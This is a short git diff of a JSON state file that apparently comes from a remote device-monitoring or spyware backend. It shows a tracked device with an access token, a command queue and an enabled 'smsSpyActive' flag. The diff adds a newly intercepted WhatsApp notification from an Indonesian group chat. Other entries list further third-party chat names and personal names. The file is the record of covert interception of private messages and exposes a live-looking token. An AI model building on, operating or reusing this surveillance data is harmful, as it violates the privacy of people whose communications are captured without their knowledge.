@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776762846847,
+    "lastSeen": 1776762852854,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎HK-dept KPP-INDE/KHVR (14 pesan): Fatar Hk",
+        "content": "📷 Pest Control\n21 April 2026 \n\nDilakukan treatment sproying dan Control area mes 11",
+        "time": "21/04 17:14",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776762853906
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎ZPSX ROBLOX (10 pesan): ~ liyudzha nurul gina",
